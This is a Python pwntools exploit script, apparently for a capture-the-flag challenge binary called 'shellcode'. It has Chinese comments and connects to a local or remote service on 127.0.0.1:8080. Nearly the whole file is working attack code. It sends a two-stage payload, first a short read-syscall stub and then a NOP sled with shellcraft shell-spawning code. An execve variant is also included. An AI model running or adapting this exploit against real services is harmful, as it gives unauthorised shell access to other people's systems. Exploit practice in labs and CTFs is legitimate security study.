#!/usr/bin/env python3
from pwn import *
from LibcSearcher import *

# 配置
context(os='linux', arch='amd64', log_level='debug')
binary = "./shellcode"

# 远程/本地切换
if args.get("REMOTE"):
    io = remote("127.0.0.1", 8080)
else:
    io = process(binary)

# ELF加载
elf = ELF(binary)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# ========== 常用函数定义 ==========
s       = lambda data               : io.send(data)
sa      = lambda delim, data        : io.sendafter(str(delim), data)
sl      = lambda data               : io.sendline(data)
sla     = lambda delim, data        : io.sendlineafter(str(delim), data)
r       = lambda num=4096           : io.recv(num)
rl      = lambda                    : io.recvline()
ru      = lambda delims, drop=False : io.recvuntil(delims, drop)
itr     = lambda                    : io.interactive()
uu32    = lambda data               : u32(data.ljust(4, b'\x00'))
uu64    = lambda data               : u64(data.ljust(8, b'\x00'))
leak    = lambda name, addr         : log.success('{} ======== > {:#x}'.format(name, addr))
p       = lambda name,data          : print("{} ======== > {}".format(name,data))

# ========== 常用泄露函数 ==========
l64     = lambda                    : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
l32     = lambda                    : u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b"\x00"))
l64_no  = lambda                    : u64(io.recv(6).ljust(8, b'\x00'))
def bug():
  gdb.attach(io)
  pause()
# ========== Exploit 开始 ==========
def exp():
    shellcode = asm("xchg rsi,rdx;xchg rbx,rax;syscall;")
    p("shellcode_len",hex(len(shellcode)))
    sla("First, please input your shellcode:",shellcode)
    sla("Second, give me your name,and I will run your shellcode:",b'Source')
    shellcode1 = b'\x90'*0x10+asm(shellcraft.sh())+asm("mov rsp,0x400000;jmp rsp")
    p("shellcode1_len",hex(len(shellcode1)))
    sleep(5)
    #gdb.attach(io)
    sl(shellcode1)
    #pause()
def exp1():
    shellcode = asm(
       '''
        mov al,59;
        push rsi;
        pop rdi;
        pop rsi;
        cdq;
        syscall;
        '''
    )
    p("shellcode_len",hex(len(shellcode)))
    sla("First, please input your shellcode:",shellcode)
    #$sla("Second, give me your name,and I will run your shellcode:",b'/bin/sh\x00')

exp()
itr()
